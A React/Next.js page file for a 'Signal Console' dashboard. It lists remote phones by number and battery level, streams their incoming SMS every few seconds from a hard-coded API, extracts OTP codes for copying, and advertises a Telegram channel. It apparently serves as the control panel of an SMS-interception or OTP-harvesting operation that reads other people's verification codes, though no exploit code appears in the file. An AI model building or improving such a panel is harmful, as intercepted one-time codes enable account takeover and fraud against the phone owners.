// app/page.tsx
'use client'

import { useCallback, useEffect, useMemo, useRef, useState } from 'react'
import {
  Activity,
  ArrowUpRight,
  Battery,
  BatteryCharging,
  BatteryLow,
  Check,
  CheckCircle2,
  CircleAlert,
  Clock3,
  Copy,
  Inbox,
  KeyRound,
  MessageSquareText,
  MonitorSmartphone,
  Radio,
  RefreshCw,
  Send,
  ShieldCheck,
  Smartphone,
  Sparkles,
  Wifi,
  X,
  Zap,
} from 'lucide-react'

const API_BASE = 'https://apifb-ten.vercel.app'

// 👇 CHANGE THIS to your Telegram channel / group link
const TELEGRAM_URL = 'https://t.me/bagga_tools'

type Device = {
  client_id: string
  mobNo: string
  battery: string | number
  status: boolean
}

type OtpMessage = {
  id: string
  sender: string
  message: string
  dateTime: string
}

type FetchState = 'idle' | 'loading' | 'success' | 'error'

/* ------------------------------------------------------------------ */
/*  Styles (keyframes + micro details)                                 */
/* ------------------------------------------------------------------ */

const GLOBAL_CSS = `
  @keyframes auroraShift {
    0%, 100% { transform: translate3d(0,0,0) scale(1); }
    50%      { transform: translate3d(4%, -4%, 0) scale(1.12); }
  }
  @keyframes floatY {
    0%, 100% { transform: translateY(0); }
    50%      { transform: translateY(-10px); }
  }
  @keyframes fadeUp {
    from { opacity: 0; transform: translateY(14px); }
    to   { opacity: 1; transform: translateY(0); }
  }
  @keyframes popIn {
    0%   { opacity: 0; transform: translateY(22px) scale(.94); }
    100% { opacity: 1; transform: translateY(0) scale(1); }
  }
  @keyframes overlayIn {
    from { opacity: 0; }
    to   { opacity: 1; }
  }
  @keyframes shimmerX {
    0%   { transform: translateX(-130%); }
    100% { transform: translateX(240%); }
  }
  @keyframes glowPulse {
    0%, 100% { opacity: .45; }
    50%      { opacity: 1; }
  }
  @keyframes ringPing {
    0%   { transform: scale(.85); opacity: .8; }
    100% { transform: scale(2.2); opacity: 0; }
  }

  .anim-aurora      { animation: auroraShift 20s ease-in-out infinite; }
  .anim-float       { animation: floatY 6s ease-in-out infinite; }
  .anim-fade-up     { animation: fadeUp .5s cubic-bezier(.2,.8,.3,1) both; }
  .anim-pop-in      { animation: popIn .38s cubic-bezier(.2,.85,.3,1) both; }
  .anim-overlay-in  { animation: overlayIn .28s ease both; }
  .anim-glow-pulse  { animation: glowPulse 3.5s ease-in-out infinite; }
  .anim-ring-ping   { animation: ringPing 2s cubic-bezier(0,0,.2,1) infinite; }

  .shimmer-line::after {
    content: '';
    position: absolute;
    inset: 0;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,.16), transparent);
    animation: shimmerX 2.4s ease-in-out infinite;
  }

  .no-scrollbar::-webkit-scrollbar { width: 6px; height: 6px; }
  .no-scrollbar::-webkit-scrollbar-track { background: transparent; }
  .no-scrollbar::-webkit-scrollbar-thumb {
    background: rgba(148, 163, 184, .22);
    border-radius: 999px;
  }
  .no-scrollbar::-webkit-scrollbar-thumb:hover { background: rgba(34, 211, 238, .45); }

  .glass {
    background: linear-gradient(180deg, rgba(255,255,255,.055), rgba(255,255,255,.015));
    backdrop-filter: blur(22px) saturate(140%);
    -webkit-backdrop-filter: blur(22px) saturate(140%);
  }

  .otp-digit {
    box-shadow:
      inset 0 1px 0 0 rgba(255,255,255,.10),
      0 0 22px -8px rgba(34,211,238,.85);
  }
`

/* ------------------------------------------------------------------ */
/*  Small helpers                                                      */
/* ------------------------------------------------------------------ */

function BatteryGlyph({ level }: { level: number }) {
  if (Number.isNaN(level)) return <Battery className="h-3.5 w-3.5 text-slate-500" />
  if (level > 60) return <BatteryCharging className="h-3.5 w-3.5 text-emerald-400" />
  if (level >= 20) return <Battery className="h-3.5 w-3.5 text-amber-400" />
  return <BatteryLow className="h-3.5 w-3.5 text-rose-400" />
}

function formatTime(value: string) {
  const parsed = new Date(value.replace(' ', 'T'))
  return Number.isNaN(parsed.getTime())
    ? value
    : parsed.toLocaleString([], {
        month: 'short',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
      })
}

function extractOtp(value: string) {
  return value.match(/\b\d{4,8}\b/)?.[0]
}

/* ------------------------------------------------------------------ */
/*  Copy button                                                        */
/* ------------------------------------------------------------------ */

function CopyButton({ text, label = 'Copy' }: { text: string; label?: string }) {
  const [copied, setCopied] = useState(false)
  const [error, setError] = useState(false)

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(text)
      setCopied(true)
      setError(false)
      setTimeout(() => setCopied(false), 1600)
    } catch {
      setError(true)
      setTimeout(() => setError(false), 1600)
    }
  }

  return (
    <button
      type="button"
      onClick={handleCopy}
      aria-label={copied ? 'Copied' : `Copy ${label}`}
      className={`inline-flex items-center gap-1.5 rounded-lg border px-3 py-1.5 text-[11px] font-medium transition-all active:scale-95 ${
        copied
          ? 'border-emerald-400/40 bg-emerald-400/10 text-emerald-300'
          : error
            ? 'border-rose-400/40 bg-rose-400/10 text-rose-300'
            : 'border-white/10 bg-white/[0.04] text-slate-300 hover:border-cyan-400/50 hover:bg-cyan-400/10 hover:text-cyan-200'
      }`}
    >
      {copied ? (
        <>
          <CheckCircle2 className="h-3.5 w-3.5" /> Copied
        </>
      ) : error ? (
        <>
          <CircleAlert className="h-3.5 w-3.5" /> Failed
        </>
      ) : (
        <>
          <Copy className="h-3.5 w-3.5" /> {label}
        </>
      )}
    </button>
  )
}

/* ------------------------------------------------------------------ */
/*  Telegram join popup (overlay)                                      */
/* ------------------------------------------------------------------ */

function TelegramModal({
  open,
  onClose,
}: {
  open: boolean
  onClose: () => void
}) {
  useEffect(() => {
    if (!open) return
    const prevOverflow = document.body.style.overflow
    document.body.style.overflow = 'hidden'
    const onKey = (e: KeyboardEvent) => {
      if (e.key === 'Escape') onClose()
    }
    window.addEventListener('keydown', onKey)
    return () => {
      document.body.style.overflow = prevOverflow
      window.removeEventListener('keydown', onKey)
    }
  }, [open, onClose])

  if (!open) return null

  const benefits = [
    'Instant OTP & device alerts',
    'Early access to new features',
    'Direct support from the team',
  ]

  return (
    <div
      className="fixed inset-0 z-[100] flex items-center justify-center px-4 py-8"
      role="dialog"
      aria-modal="true"
      aria-labelledby="tg-title"
    >
      {/* overlay */}
      <div
        className="anim-overlay-in absolute inset-0 bg-[#03050c]/85 backdrop-blur-md"
        onClick={onClose}
      />

      {/* card */}
      <div className="anim-pop-in relative w-full max-w-[420px]">
        {/* glow behind card */}
        <div
          aria-hidden
          className="anim-glow-pulse absolute -inset-6 -z-10 rounded-[36px] blur-3xl"
          style={{
            background:
              'radial-gradient(60% 60% at 50% 20%, rgba(34,211,238,.55), transparent 70%),' +
              'radial-gradient(60% 60% at 80% 90%, rgba(168,85,247,.45), transparent 70%)',
          }}
        />

        <div className="relative overflow-hidden rounded-3xl border border-white/10 bg-[#080d18]/95 p-6 shadow-[0_30px_80px_-20px_rgba(0,0,0,.9)] sm:p-7">
          {/* top gradient hairline */}
          <div className="absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent via-cyan-400/70 to-transparent" />

          <button
            type="button"
            onClick={onClose}
            aria-label="Close"
            className="absolute right-4 top-4 flex h-8 w-8 items-center justify-center rounded-lg border border-white/10 bg-white/[0.04] text-slate-400 transition hover:border-white/20 hover:bg-white/10 hover:text-white"
          >
            <X className="h-4 w-4" />
          </button>

          {/* icon */}
          <div className="relative mx-auto mb-5 flex h-16 w-16 items-center justify-center">
            <span className="anim-ring-ping absolute inset-0 rounded-2xl bg-cyan-400/30" />
            <div className="anim-float relative flex h-16 w-16 items-center justify-center rounded-2xl bg-gradient-to-br from-cyan-400 to-sky-600 shadow-[0_10px_40px_-8px_rgba(34,211,238,.9)]">
              <Send className="h-7 w-7 -translate-x-[1px] text-white" />
            </div>
          </div>

          <h2
            id="tg-title"
            className="text-center text-xl font-semibold tracking-tight text-white"
          >
            Join our Telegram
          </h2>
          <p className="mx-auto mt-2 max-w-[300px] text-center text-[13px] leading-relaxed text-slate-400">
            Get instant OTP drops, uptime notices and feature updates right in your
            pocket.
          </p>

          <ul className="mt-5 space-y-2.5">
            {benefits.map((b) => (
              <li
                key={b}
                className="flex items-center gap-2.5 rounded-xl border border-white/[0.06] bg-white/[0.025] px-3 py-2.5 text-[13px] text-slate-300"
              >
                <span className="flex h-5 w-5 shrink-0 items-center justify-center rounded-full bg-emerald-400/15 text-emerald-400">
                  <Check className="h-3 w-3" />
                </span>
                {b}
              </li>
            ))}
          </ul>

          <a
            href={TELEGRAM_URL}
            target="_blank"
            rel="noopener noreferrer"
            onClick={onClose}
            className="group mt-6 flex h-12 w-full items-center justify-center gap-2 rounded-xl bg-gradient-to-r from-cyan-400 to-sky-500 text-sm font-semibold text-[#04121a] shadow-[0_12px_40px_-12px_rgba(34,211,238,.95)] transition-all hover:brightness-110 active:scale-[.985]"
          >
            <Send className="h-4 w-4" />
            Join Channel
            <ArrowUpRight className="h-4 w-4 transition-transform group-hover:-translate-y-0.5 group-hover:translate-x-0.5" />
          </a>

          <button
            type="button"
            onClick={onClose}
            className="mt-2.5 w-full rounded-xl py-2.5 text-[13px] font-medium text-slate-500 transition hover:bg-white/[0.04] hover:text-slate-300"
          >
            Maybe later
          </button>
        </div>
      </div>
    </div>
  )
}

/* ------------------------------------------------------------------ */
/*  Page                                                               */
/* ------------------------------------------------------------------ */

export default function HomePage() {
  const [dbCode, setDbCode] = useState('101')
  const [debouncedCode, setDebouncedCode] = useState(dbCode)
  const [devices, setDevices] = useState<Device[]>([])
  const [selectedId, setSelectedId] = useState('')
  const [messages, setMessages] = useState<OtpMessage[]>([])
  const [deviceState, setDeviceState] = useState<FetchState>('idle')
  const [messageState, setMessageState] = useState<FetchState>('idle')
  const [error, setError] = useState('')
  const [autoRefresh, setAutoRefresh] = useState(true)
  const [lastUpdated, setLastUpdated] = useState<Date | null>(null)
  const [showTelegram, setShowTelegram] = useState(false)
  const abortRef = useRef<AbortController | null>(null)

  /* Telegram popup — appears on every visit */
  useEffect(() => {
    const t = setTimeout(() => setShowTelegram(true), 900)
    return () => clearTimeout(t)
  }, [])

  const selectedDevice = useMemo(
    () => devices.find((d) => d.client_id === selectedId),
    [devices, selectedId],
  )

  useEffect(() => {
    const t = setTimeout(() => setDebouncedCode(dbCode.trim()), 400)
    return () => clearTimeout(t)
  }, [dbCode])

  /* ---------------------------- devices ---------------------------- */
  const fetchDevices = useCallback(
    async (signal?: AbortSignal) => {
      if (!debouncedCode) return
      setDeviceState('loading')
      setError('')
      try {
        const res = await fetch(
          `${API_BASE}/api/${encodeURIComponent(debouncedCode)}/devices`,
          { signal, cache: 'no-store' },
        )
        if (!res.ok) {
          throw new Error(
            res.status === 404
              ? 'Database code not found.'
              : `Unable to load devices (${res.status}).`,
          )
        }
        const payload = await res.json()
        const active: Device[] = Array.isArray(payload.devices)
          ? payload.devices.filter((d: Device) => d.status)
          : []
        setDevices(active)
        setSelectedId((cur) =>
          active.some((d) => d.client_id === cur)
            ? cur
            : active[0]?.client_id ?? '',
        )
        setDeviceState('success')
        setLastUpdated(new Date())
      } catch (cause) {
        if ((cause as Error).name === 'AbortError') return
        setDevices([])
        setSelectedId('')
        setMessages([])
        setDeviceState('error')
        setError((cause as Error).message || 'Could not connect to the API.')
      }
    },
    [debouncedCode],
  )

  /* --------------------------- messages ---------------------------- */
  const fetchMessages = useCallback(
    async (signal?: AbortSignal) => {
      if (!selectedDevice) {
        setMessages([])
        setMessageState('idle')
        return
      }
      setMessageState('loading')
      try {
        const res = await fetch(
          `${API_BASE}/api/${encodeURIComponent(
            debouncedCode,
          )}/messages/${encodeURIComponent(selectedDevice.client_id)}`,
          { signal, cache: 'no-store' },
        )
        if (!res.ok) throw new Error(`Unable to load messages (${res.status}).`)
        const payload = await res.json()
        setMessages(Array.isArray(payload.messages) ? payload.messages : [])
        setMessageState('success')
        setLastUpdated(new Date())
      } catch (cause) {
        if ((cause as Error).name === 'AbortError') return
        setMessages([])
        setMessageState('error')
        setError((cause as Error).message || 'Could not load messages.')
      }
    },
    [debouncedCode, selectedDevice],
  )

  useEffect(() => {
    abortRef.current?.abort()
    const c = new AbortController()
    abortRef.current = c
    fetchDevices(c.signal)
    return () => c.abort()
  }, [fetchDevices])

  useEffect(() => {
    const c = new AbortController()
    fetchMessages(c.signal)
    return () => c.abort()
  }, [fetchMessages])

  useEffect(() => {
    if (!autoRefresh || !selectedDevice) return
    const id = window.setInterval(() => fetchMessages(), 3000)
    return () => window.clearInterval(id)
  }, [autoRefresh, selectedDevice, fetchMessages])

  const busy = deviceState === 'loading' || messageState === 'loading'
  const refreshAll = () => {
    fetchDevices()
    if (selectedDevice) fetchMessages()
  }

  /* ------------------------------ UI ------------------------------- */
  return (
    <div className="relative min-h-screen overflow-x-hidden bg-[#05070f] text-slate-100">
      <style dangerouslySetInnerHTML={{ __html: GLOBAL_CSS }} />

      {/* ---------------- ambient background ---------------- */}
      <div aria-hidden className="pointer-events-none fixed inset-0 overflow-hidden">
        <div
          className="anim-aurora absolute -left-[15%] -top-[25%] h-[70vh] w-[70vw] rounded-full blur-[120px]"
          style={{ background: 'radial-gradient(circle, rgba(34,211,238,.28), transparent 65%)' }}
        />
        <div
          className="anim-aurora absolute -right-[15%] top-[5%] h-[60vh] w-[55vw] rounded-full blur-[120px]"
          style={{
            background: 'radial-gradient(circle, rgba(168,85,247,.26), transparent 65%)',
            animationDelay: '-6s',
          }}
        />
        <div
          className="anim-aurora absolute bottom-[-25%] left-[25%] h-[55vh] w-[60vw] rounded-full blur-[130px]"
          style={{
            background: 'radial-gradient(circle, rgba(16,185,129,.18), transparent 65%)',
            animationDelay: '-12s',
          }}
        />
        {/* grid */}
        <div
          className="absolute inset-0 opacity-[0.055]"
          style={{
            backgroundImage:
              'linear-gradient(rgba(255,255,255,.7) 1px, transparent 1px),' +
              'linear-gradient(90deg, rgba(255,255,255,.7) 1px, transparent 1px)',
            backgroundSize: '48px 48px',
            maskImage: 'radial-gradient(ellipse at 50% 30%, black 20%, transparent 72%)',
            WebkitMaskImage:
              'radial-gradient(ellipse at 50% 30%, black 20%, transparent 72%)',
          }}
        />
      </div>

      {/* ---------------- content ---------------- */}
      <div className="relative mx-auto max-w-7xl px-4 pb-12 pt-6 sm:px-6 lg:px-8">
        {/* ============ HEADER ============ */}
        <header className="anim-fade-up mb-6 flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
          <div className="flex items-center gap-3">
            <div className="relative flex h-11 w-11 items-center justify-center rounded-2xl bg-gradient-to-br from-cyan-400/25 to-fuchsia-500/15 ring-1 ring-inset ring-white/15 backdrop-blur">
              <Radio className="h-5 w-5 text-cyan-300" />
              <span className="absolute -right-0.5 -top-0.5 h-2.5 w-2.5 rounded-full bg-emerald-400 shadow-[0_0_14px_3px_rgba(52,211,153,.65)]" />
            </div>
            <div>
              <h1 className="text-[17px] font-semibold leading-tight tracking-tight text-white">
                Signal Console
              </h1>
              <p className="text-[11px] text-slate-400">
                Real-time OTP intelligence ·{' '}
                <span className="font-medium text-cyan-300">live</span>
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            {/* DB code */}
            <div className="relative">
              <KeyRound className="pointer-events-none absolute left-3 top-1/2 h-3.5 w-3.5 -translate-y-1/2 text-slate-500" />
              <input
                value={dbCode}
                onChange={(e) => setDbCode(e.target.value)}
                placeholder="DB code"
                aria-label="Database code"
                className="h-11 w-[132px] rounded-xl border border-white/10 bg-white/[0.04] pl-9 pr-3 font-mono text-sm text-white outline-none backdrop-blur transition placeholder:font-sans placeholder:text-slate-500 focus:border-cyan-400/50 focus:bg-white/[0.06] focus:ring-2 focus:ring-cyan-400/20"
              />
            </div>

            <button
              type="button"
              onClick={refreshAll}
              disabled={busy}
              className="inline-flex h-11 items-center gap-2 rounded-xl border border-white/10 bg-white/[0.04] px-4 text-[13px] font-medium text-slate-200 backdrop-blur transition hover:border-cyan-400/40 hover:bg-cyan-400/10 hover:text-cyan-200 disabled:opacity-60"
            >
              <RefreshCw className={`h-4 w-4 ${busy ? 'animate-spin' : ''}`} />
              <span className="hidden sm:inline">Refresh</span>
            </button>
          </div>
        </header>

        {/* ============ BODY ============ */}
        <div className="grid gap-5 lg:grid-cols-[320px_1fr]">
          {/* ---------- sidebar ---------- */}
          <aside className="anim-fade-up space-y-3" style={{ animationDelay: '60ms' }}>
            <div className="glass overflow-hidden rounded-2xl border border-white/10 shadow-[inset_0_1px_0_0_rgba(255,255,255,.06)]">
              <div className="flex items-center justify-between border-b border-white/[0.06] px-4 py-3">
                <div className="flex items-center gap-2">
                  <MonitorSmartphone className="h-4 w-4 text-slate-400" />
                  <h2 className="text-[13px] font-semibold text-white">Devices</h2>
                </div>
                <span className="rounded-full border border-cyan-400/30 bg-cyan-400/10 px-2 py-0.5 text-[10px] font-semibold uppercase tracking-wider text-cyan-300">
                  {devices.length} active
                </span>
              </div>

              <div className="no-scrollbar max-h-[58vh] overflow-y-auto">
                {/* loading */}
                {deviceState === 'loading' && (
                  <div className="space-y-2 p-3">
                    {[1, 2, 3].map((i) => (
                      <div
                        key={i}
                        className="shimmer-line relative h-16 overflow-hidden rounded-xl bg-white/[0.04]"
                      />
                    ))}
                  </div>
                )}

                {/* error */}
                {deviceState === 'error' && (
                  <div className="m-3 rounded-xl border border-rose-500/25 bg-rose-500/[0.08] p-3">
                    <div className="mb-1 flex items-center gap-1.5 text-[13px] font-medium text-rose-200">
                      <CircleAlert className="h-4 w-4" /> Connection failed
                    </div>
                    <p className="text-[11px] leading-relaxed text-rose-200/70">{error}</p>
                  </div>
                )}

                {/* empty */}
                {deviceState === 'success' && devices.length === 0 && (
                  <div className="px-4 py-10 text-center">
                    <Inbox className="mx-auto mb-2 h-8 w-8 text-slate-600" />
                    <p className="text-[13px] font-medium text-slate-300">
                      No active devices
                    </p>
                    <p className="mt-1 text-[11px] text-slate-500">
                      Check the DB code above.
                    </p>
                  </div>
                )}

                {/* list */}
                {deviceState === 'success' && devices.length > 0 && (
                  <ul className="divide-y divide-white/[0.05]">
                    {devices.map((device) => {
                      const battery = Number(device.battery)
                      const selected = device.client_id === selectedId
                      return (
                        <li key={device.client_id}>
                          <button
                            type="button"
                            onClick={() => setSelectedId(device.client_id)}
                            aria-pressed={selected}
                            className={`group relative flex w-full items-center gap-3 px-4 py-3 text-left transition ${
                              selected
                                ? 'bg-gradient-to-r from-cyan-400/[0.14] via-cyan-400/[0.04] to-transparent'
                                : 'hover:bg-white/[0.03]'
                            }`}
                          >
                            {selected && (
                              <span className="absolute left-0 top-1/2 h-7 w-[3px] -translate-y-1/2 rounded-r-full bg-cyan-400 shadow-[0_0_14px_1px_rgba(34,211,238,.85)]" />
                            )}
                            <div
                              className={`flex h-9 w-9 shrink-0 items-center justify-center rounded-xl ring-1 ring-inset transition ${
                                selected
                                  ? 'bg-cyan-400/20 text-cyan-200 ring-cyan-400/40'
                                  : 'bg-white/[0.04] text-slate-400 ring-white/10 group-hover:text-slate-300'
                              }`}
                            >
                              <Smartphone className="h-4 w-4" />
                            </div>
                            <div className="min-w-0 flex-1">
                              <p className="truncate text-[13px] font-medium text-slate-100">
                                {device.mobNo}
                              </p>
                              <p className="truncate font-mono text-[10px] text-slate-500">
                                {device.client_id}
                              </p>
                            </div>
                            <div className="flex items-center gap-1 text-[11px] text-slate-400">
                              <BatteryGlyph level={battery} />
                              <span className="tabular-nums">{battery}%</span>
                            </div>
                          </button>
                        </li>
                      )
                    })}
                  </ul>
                )}
              </div>
            </div>

            {/* status strip */}
            <div className="glass flex items-center justify-between rounded-xl border border-white/[0.07] px-3.5 py-2.5 text-[11px] text-slate-400">
              <span className="flex items-center gap-1.5">
                <Wifi className="h-3 w-3 text-emerald-400" />
                API online
              </span>
              <span className="flex items-center gap-1.5">
                <Activity className="h-3 w-3 text-cyan-400" />
                {autoRefresh ? '3s polling' : 'manual'}
              </span>
            </div>
          </aside>

          {/* ---------- main panel ---------- */}
          <section className="anim-fade-up space-y-3" style={{ animationDelay: '120ms' }}>
            <div className="glass relative overflow-hidden rounded-2xl border border-white/10 shadow-[inset_0_1px_0_0_rgba(255,255,255,.06)]">
              {/* top hairline */}
              <div className="absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent via-cyan-400/40 to-transparent" />

              {/* header */}
              <div className="flex flex-col gap-3 border-b border-white/[0.06] p-5 sm:flex-row sm:items-center sm:justify-between">
                <div className="min-w-0">
                  <h2 className="flex items-center gap-2 text-[15px] font-semibold text-white">
                    {selectedDevice ? (
                      <>
                        <Sparkles className="h-4 w-4 shrink-0 text-cyan-300" />
                        <span className="truncate">{selectedDevice.mobNo}</span>
                      </>
                    ) : (
                      'Select a device'
                    )}
                  </h2>
                  <p className="mt-0.5 truncate text-[11px] text-slate-400">
                    {selectedDevice
                      ? `Incoming auth messages for ${selectedDevice.client_id}`
                      : 'Choose an active endpoint from the list.'}
                  </p>
                </div>

                <div className="flex shrink-0 items-center gap-3">
                  {selectedDevice && (
                    <span className="inline-flex items-center gap-1.5 rounded-full border border-emerald-400/30 bg-emerald-400/10 px-2.5 py-1 text-[10px] font-semibold uppercase tracking-wider text-emerald-300">
                      <span className="relative flex h-1.5 w-1.5">
                        <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75" />
                        <span className="relative inline-flex h-1.5 w-1.5 rounded-full bg-emerald-400" />
                      </span>
                      Live
                    </span>
                  )}

                  <button
                    type="button"
                    role="switch"
                    aria-checked={autoRefresh}
                    aria-label="Toggle auto refresh"
                    onClick={() => setAutoRefresh((v) => !v)}
                    className={`flex items-center gap-2 rounded-full border px-2.5 py-1 text-[11px] font-medium transition ${
                      autoRefresh
                        ? 'border-cyan-400/30 bg-cyan-400/10 text-cyan-200'
                        : 'border-white/10 bg-white/[0.03] text-slate-400 hover:text-slate-300'
                    }`}
                  >
                    <span
                      className={`relative h-3.5 w-6 rounded-full transition ${
                        autoRefresh ? 'bg-cyan-400/80' : 'bg-white/15'
                      }`}
                    >
                      <span
                        className={`absolute top-[2px] h-2.5 w-2.5 rounded-full bg-white shadow transition-all ${
                          autoRefresh ? 'left-[13px]' : 'left-[2px]'
                        }`}
                      />
                    </span>
                    Auto
                  </button>
                </div>
              </div>

              {/* meta strip */}
              {selectedDevice && (
                <div className="flex items-center justify-between border-b border-white/[0.06] px-5 py-2 text-[11px] text-slate-500">
                  <span className="flex items-center gap-1.5">
                    <Clock3 className="h-3 w-3" />
                    {lastUpdated
                      ? `Updated ${lastUpdated.toLocaleTimeString()}`
                      : 'Waiting for data'}
                  </span>
                  <span className="flex items-center gap-1.5 tabular-nums">
                    <Zap className="h-3 w-3 text-cyan-400/70" />
                    {messages.length} {messages.length === 1 ? 'message' : 'messages'}
                  </span>
                </div>
              )}

              {/* body */}
              <div className="p-4 sm:p-5">
                {/* loading */}
                {messageState === 'loading' && (
                  <div className="space-y-3">
                    {[1, 2, 3].map((i) => (
                      <div
                        key={i}
                        className="shimmer-line relative h-28 overflow-hidden rounded-xl bg-white/[0.04]"
                      />
                    ))}
                  </div>
                )}

                {/* error */}
                {messageState === 'error' && (
                  <div className="rounded-xl border border-rose-500/25 bg-rose-500/[0.08] p-4">
                    <div className="mb-1 flex items-center gap-2 text-[13px] font-medium text-rose-200">
                      <CircleAlert className="h-4 w-4" /> Stream unavailable
                    </div>
                    <p className="text-[11px] leading-relaxed text-rose-200/70">{error}</p>
                    <button
                      type="button"
                      onClick={() => fetchMessages()}
                      className="mt-3 rounded-lg border border-rose-400/40 px-3 py-1.5 text-[11px] font-medium text-rose-100 transition hover:bg-rose-500/20"
                    >
                      Try again
                    </button>
                  </div>
                )}

                {/* no device */}
                {!selectedDevice && messageState !== 'loading' && (
                  <div className="py-16 text-center">
                    <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-2xl border border-white/[0.07] bg-white/[0.03]">
                      <MonitorSmartphone className="h-6 w-6 text-slate-600" />
                    </div>
                    <p className="text-[13px] font-medium text-slate-300">
                      No device selected
                    </p>
                    <p className="mt-1 text-[11px] text-slate-500">
                      Pick a device on the left to view its OTP stream.
                    </p>
                  </div>
                )}

                {/* empty messages */}
                {selectedDevice &&
                  messageState === 'success' &&
                  messages.length === 0 && (
                    <div className="py-16 text-center">
                      <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-2xl border border-white/[0.07] bg-white/[0.03]">
                        <MessageSquareText className="h-6 w-6 text-slate-600" />
                      </div>
                      <p className="text-[13px] font-medium text-slate-300">
                        No messages yet
                      </p>
                      <p className="mt-1 text-[11px] text-slate-500">
                        New OTPs will appear here automatically.
                      </p>
                    </div>
                  )}

                {/* message list */}
                {selectedDevice &&
                  messageState === 'success' &&
                  messages.length > 0 && (
                    <ul className="space-y-3">
                      {messages.map((item, index) => {
                        const otp = extractOtp(item.message)
                        const cleaned = otp
                          ? item.message.replace(otp, '').replace(/\s+/g, ' ').trim()
                          : item.message

                        return (
                          <li
                            key={item.id}
                            className="group relative overflow-hidden rounded-xl border border-white/[0.08] bg-gradient-to-br from-white/[0.045] to-white/[0.012] p-4 transition-all duration-300 hover:border-cyan-400/30 hover:from-cyan-400/[0.06]"
                          >
                            {/* hover hairline */}
                            <div className="absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent via-cyan-400/60 to-transparent opacity-0 transition-opacity duration-300 group-hover:opacity-100" />

                            {/* top row */}
                            <div className="mb-2.5 flex items-center justify-between gap-2">
                              <div className="flex min-w-0 items-center gap-2">
                                <div className="flex h-7 w-7 shrink-0 items-center justify-center rounded-lg bg-gradient-to-br from-cyan-400/20 to-fuchsia-400/10 text-[10px] font-bold uppercase text-cyan-300 ring-1 ring-inset ring-cyan-400/25">
                                  {item.sender.slice(0, 2)}
                                </div>
                                <span className="truncate text-[13px] font-semibold text-slate-100">
                                  {item.sender}
                                </span>
                              </div>

                              {index === 0 ? (
                                <span className="flex shrink-0 items-center gap-1 rounded-full border border-emerald-400/30 bg-emerald-400/10 px-2 py-0.5 text-[9px] font-bold uppercase tracking-wider text-emerald-300">
                                  <span className="h-1 w-1 rounded-full bg-emerald-400" />
                                  New
                                </span>
                              ) : (
                                <span className="shrink-0 rounded-full border border-fuchsia-400/25 bg-fuchsia-400/10 px-2 py-0.5 text-[9px] font-bold uppercase tracking-wider text-fuchsia-300">
                                  OTP
                                </span>
                              )}
                            </div>

                            {/* cleaned message */}
                            {cleaned && (
                              <p className="mb-3 break-words text-[12.5px] leading-relaxed text-slate-400">
                                {cleaned}
                              </p>
                            )}

                            {/* OTP digits */}
                            {otp && (
                              <div className="mb-3 flex flex-wrap items-center gap-1.5">
                                {otp.split('').map((digit, i) => (
                                  <span
                                    key={i}
                                    className="otp-digit flex h-10 w-8 items-center justify-center rounded-lg border border-cyan-400/25 bg-cyan-400/[0.09] font-mono text-[17px] font-bold text-cyan-100"
                                  >
                                    {digit}
                                  </span>
                                ))}
                                <span className="ml-1.5 font-mono text-[10px] uppercase tracking-[0.18em] text-cyan-400/60">
                                  code
                                </span>
                              </div>
                            )}

                            {/* footer row */}
                            <div className="flex items-center justify-between gap-2 text-[11px] text-slate-500">
                              <span className="flex items-center gap-1.5">
                                <Clock3 className="h-3 w-3" />
                                {formatTime(item.dateTime)}
                              </span>
                              <CopyButton text={otp ?? item.message} label={otp ? 'Copy OTP' : 'Copy'} />
                            </div>
                          </li>
                        )
                      })}
                    </ul>
                  )}
              </div>
            </div>

            {/* page footer */}
            <footer className="flex flex-wrap items-center justify-between gap-2 px-1 text-[11px] text-slate-500">
              <span className="flex items-center gap-1.5">
                <Activity className="h-3 w-3 text-cyan-400" />
                {API_BASE.replace('https://', '')}
              </span>
              <span className="flex items-center gap-1.5">
                <ShieldCheck className="h-3 w-3 text-emerald-400" />
                Secure channel
              </span>
            </footer>
          </section>
        </div>
      </div>

      {/* ---------------- floating telegram button ---------------- */}
      <button
        type="button"
        onClick={() => setShowTelegram(true)}
        aria-label="Open Telegram channel popup"
        className="group fixed bottom-5 right-5 z-40 flex h-12 w-12 items-center justify-center rounded-2xl bg-gradient-to-br from-cyan-400 to-sky-500 text-[#04121a] shadow-[0_14px_40px_-10px_rgba(34,211,238,.95)] transition-all hover:scale-105 active:scale-95"
      >
        <Send className="h-5 w-5 -translate-x-[1px] transition-transform group-hover:rotate-12" />
        <span className="absolute -right-0.5 -top-0.5 h-2.5 w-2.5 rounded-full bg-fuchsia-400 ring-2 ring-[#05070f]" />
      </button>

      {/* ---------------- telegram popup ---------------- */}
      <TelegramModal open={showTelegram} onClose={() => setShowTelegram(false)} />
    </div>
  )
}
